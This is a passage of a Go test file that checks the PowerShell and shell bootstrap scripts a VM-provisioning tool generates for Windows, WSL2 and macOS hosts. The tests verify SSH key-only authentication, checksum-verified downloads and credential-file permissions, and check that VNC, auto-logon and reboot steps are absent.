		"OpenSSH-Win64.zip",
		openSSHWin64ZipSHA256,
		"Git-2.52.0-64-bit.exe",
		gitForWindowsSetupSHA256,
		"$passwordPath = $windowsPasswordPath",
		"$credentialPaths = @($passwordPath)",
		"PubkeyAuthentication yes",
		"PasswordAuthentication no",
		`icacls.exe $credentialPath /inheritance:r /grant "*${userSID}:F" /grant "*S-1-5-32-544:F" /grant "*S-1-5-18:F"`,
		"Restart-Service sshd -Force",
		"Set-Content -NoNewline -Encoding ASCII -Path $setupCompletePath",
	} {
		if !strings.Contains(got, want) {
			t.Fatalf("windows core bootstrap missing %q", want)
		}
	}
	setupIndex := strings.Index(got, "Set-Content -NoNewline -Encoding ASCII -Path $setupCompletePath")
	restartIndex := strings.Index(got, "Restart-Service sshd -Force")
	if setupIndex < 0 || restartIndex < 0 {
		t.Fatalf("windows core bootstrap missing setup/restart markers")
	}
	if setupIndex > restartIndex {
		t.Fatalf("windows core bootstrap must mark setup complete before restarting sshd")
	}
	for _, notWant := range []string{
		"tightvnc-2.8.85-gpl-setup-64bit.msi",
		`C:\ProgramData\crabbox\vnc.password`,
		"CrabboxUserVNC",
		"AutoAdminLogon",
		"Restart-Computer -Force",
		"*S-1-5-32-545:",
		"Authenticated Users",
	} {
		if strings.Contains(got, notWant) {
			t.Fatalf("windows core bootstrap should not include %q", notWant)
		}
	}
}

func TestAWSUserDataWindowsWSL2Profile(t *testing.T) {
	cfg := baseConfig()
	cfg.Provider = "aws"
	cfg.TargetOS = targetWindows
	cfg.WindowsMode = windowsModeWSL2
	cfg.WorkRoot = `/work/crabbox`
	got := windowsBootstrapPowerShell(cfg, "ssh-ed25519 test")
	for _, want := range []string{
		`$workRoot = 'C:\crabbox'`,
		`C:\ProgramData\crabbox\windows.password`,
		"Microsoft-Windows-Subsystem-Linux",
		"VirtualMachinePlatform",
		"HypervisorPlatform",
		"bcdedit.exe /set hypervisorlaunchtype auto",
		"wsl.exe --update --web-download",
		"wsl.exe --set-default-version 2",
		ubuntuWSLRootFSURL,
		ubuntuWSLRootFSSHA256,
		"Assert-CrabboxFileSHA256 $wslRootfsDownload",
		"Assert-CrabboxFileSHA256 $wslRootfs",
		"$wslRootfsMinBytes = 100 * 1024 * 1024",
		`$wslRootfsDownload = "$wslRootfs.download"`,
		"Remove-Item -Force -LiteralPath $setupCompletePath -ErrorAction SilentlyContinue",
		"Remove-Item -Force -LiteralPath $wslRootfs",
		"Remove-Item -Force -LiteralPath $wslRootfsDownload",
		"curl.exe -fL --retry 8",
		"downloaded WSL rootfs is incomplete",
		"Move-Item -Force -LiteralPath $wslRootfsDownload -Destination $wslRootfs",
		"wsl.exe --import $wslDistro $wslRoot $wslRootfs --version 2",
		"wsl.exe --set-default $wslDistro",
		`$wslSetup = "C:\ProgramData\crabbox\wsl\linux-setup.sh"`,
		"WriteAllText($wslSetup",
		"wsl.exe -d $wslDistro --user root --exec bash /mnt/c/ProgramData/crabbox/wsl/linux-setup.sh",
		"apt-get install -y --no-install-recommends ca-certificates curl git jq python3-minimal rsync",
		"trufflehog_version='3.95.9'",
		"trufflehog_${trufflehog_version}_linux_amd64.tar.gz",
		wslTruffleHogAMD64SHA256,
		"sha256sum -c -",
		`mv -f "$trufflehog_candidate" /usr/local/bin/trufflehog`,
		"trufflehog --no-update --version >/dev/null",
		"cat >/usr/local/bin/crabbox-ready",
		`wslpath -w '/work/crabbox'`,
		`test -w '/work/crabbox'`,
		"PubkeyAuthentication yes",
		"PasswordAuthentication no",
	} {
		if !strings.Contains(got, want) {
			t.Fatalf("windows WSL2 bootstrap missing %q", want)
		}
	}
	for _, notWant := range []string{
		"tightvnc-2.8.85-gpl-setup-64bit.msi",
		`C:\ProgramData\crabbox\vnc.password`,
		"CrabboxUserVNC",
		"AutoAdminLogon",
		"DefaultDomainName",
		"PrivacyConsentStatus",
		"SetupDisplayedEula",
		"SkipMachineOOBE",
		"SkipUserOOBE",
		"EnableFirstLogonAnimation",
	} {
		if strings.Contains(got, notWant) {
			t.Fatalf("windows WSL2 bootstrap should not include %q", notWant)
		}
	}
	if verifyIndex, importIndex := strings.LastIndex(got, "Assert-CrabboxFileSHA256 $wslRootfs"), strings.Index(got, "wsl.exe --import $wslDistro"); verifyIndex < 0 || importIndex < 0 || verifyIndex > importIndex {
		t.Fatalf("windows WSL2 bootstrap must verify the rootfs before import")
	}
}

func TestWindowsWSL2BootstrapAttemptStreamsOutput(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("POSIX fake ssh helper is only reliable on Unix hosts")
	}
	dir := t.TempDir()
	sshPath := filepath.Join(dir, "ssh")
	script := `#!/bin/sh
while IFS= read -r _; do :; done || true
printf 'BOOTSTRAP_VISIBLE_OUTPUT\n'
exit 0
`
	if err := os.WriteFile(sshPath, []byte(script), 0o755); err != nil {
		t.Fatal(err)
	}
	t.Setenv("PATH", dir+string(os.PathListSeparator)+os.Getenv("PATH"))

	cfg := baseConfig()
	cfg.Provider = "azure"
	cfg.TargetOS = targetWindows
	cfg.WindowsMode = windowsModeWSL2
	target := SSHTarget{
		User:        "crabbox",
		Host:        "127.0.0.1",
		Port:        "22",
		TargetOS:    targetWindows,
		WindowsMode: windowsModeNormal,
	}
	var stderr bytes.Buffer
	if err := runWindowsWSL2BootstrapAttempt(context.Background(), cfg, target, "ssh-ed25519 test", &stderr); err != nil {
		t.Fatalf("bootstrap attempt error=%v\nstderr=%s", err, stderr.String())
	}
	if !strings.Contains(stderr.String(), "BOOTSTRAP_VISIBLE_OUTPUT") {
		t.Fatalf("bootstrap output was not streamed:\n%s", stderr.String())
	}
}

func TestWindowsWSL2BootstrapCompleteProbeUsesWindowsMarker(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("POSIX fake ssh helper is only reliable on Unix hosts")
	}
	dir := t.TempDir()
	logPath := installRecordingSSH(t, dir)
	bootstrapTarget := SSHTarget{
		User:        "crabbox",
		Host:        "127.0.0.1",
		Port:        "22",
		TargetOS:    targetWindows,
		WindowsMode: windowsModeNormal,
	}
	target := bootstrapTarget
	target.WindowsMode = windowsModeWSL2

	if !probeWindowsWSL2BootstrapComplete(context.Background(), bootstrapTarget, &target, 30*time.Second) {
		t.Fatal("setup marker probe should pass with fake ssh")
	}
	data, err := os.ReadFile(logPath)
	if err != nil {
		t.Fatal(err)
	}
	commands := recordedSSHCommands(string(data))
	if len(commands) != 1 {
		t.Fatalf("ssh commands=%d want 1:\n%s", len(commands), data)
	}
	decoded := decodePowerShellCommand(t, commands[0])
	for _, want := range []string{
		`Test-Path -LiteralPath "C:\ProgramData\crabbox\setup-complete"`,
		`setup-complete marker missing`,
	} {
		if !strings.Contains(decoded, want) {
			t.Fatalf("setup marker probe missing %q in %q", want, decoded)
		}
	}
	if strings.Contains(decoded, "wsl.exe") {
		t.Fatalf("setup marker probe should not invoke WSL: %q", decoded)
	}
}

func TestAzureWindowsDesktopExtensionBootstrapLeavesRebootToSSHBootstrap(t *testing.T) {
	cfg := baseConfig()
	cfg.Provider = "azure"
	cfg.TargetOS = targetWindows
	cfg.WindowsMode = windowsModeNormal
	cfg.Desktop = true
	cfg.WorkRoot = `C:\crabbox`
	got := azureWindowsBootstrapPowerShell(cfg, "ssh-rsa test")
	if !strings.Contains(got, "PasswordAuthentication no") {
		t.Fatalf("azure windows extension bootstrap should enforce key auth")
	}
	if strings.Contains(got, "Set-Content -NoNewline -Encoding ASCII -Path $setupCompletePath") {
		t.Fatalf("azure desktop extension bootstrap should not mark setup complete before desktop SSH bootstrap")
	}
	if strings.Contains(got, "Restart-Computer") {
		t.Fatalf("azure extension bootstrap must not reboot")
	}
	if strings.Contains(got, "tightvnc") {
		t.Fatalf("azure extension bootstrap should not install VNC")
	}
}

func TestAWSUserDataMacOSProfile(t *testing.T) {
	cfg := baseConfig()
	cfg.Provider = "aws"
	cfg.TargetOS = targetMacOS
	cfg.SSHUser = "ec2-user"
	cfg.WorkRoot = defaultMacOSWorkRoot
	defaultWorkRootCfg := cfg
	defaultWorkRootCfg.WorkRoot = ""
	if got := macOSUserData(defaultWorkRootCfg, "ssh-ed25519 test"); !strings.Contains(got, defaultMacOSWorkRoot) {
		t.Fatalf("macOS user data should default work root")
	}
	got := awsUserData(cfg, "ssh-ed25519 test")
	for _, want := range []string{
		"#!/bin/bash",
		defaultMacOSWorkRoot,
		"/var/db/crabbox/vnc.password",
		"set +o pipefail",
		"set -o pipefail",
		"failed to generate vnc password",
		"crabbox_public_key='ssh-ed25519 test'",
		"authorized_keys",
		"crabbox_ssh_ports=('2222' '22')",
		"printf 'Port %s\\n' \"$port\"",
		"systemsetup -setremotelogin on",
		"com.openssh.sshd",
		"com.apple.screensharing",
		"/usr/local/bin/crabbox-ready",
		"nc -z 127.0.0.1 5900",
	} {
		if !strings.Contains(got, want) {
			t.Fatalf("macOS user data missing %q", want)
		}
	}
}
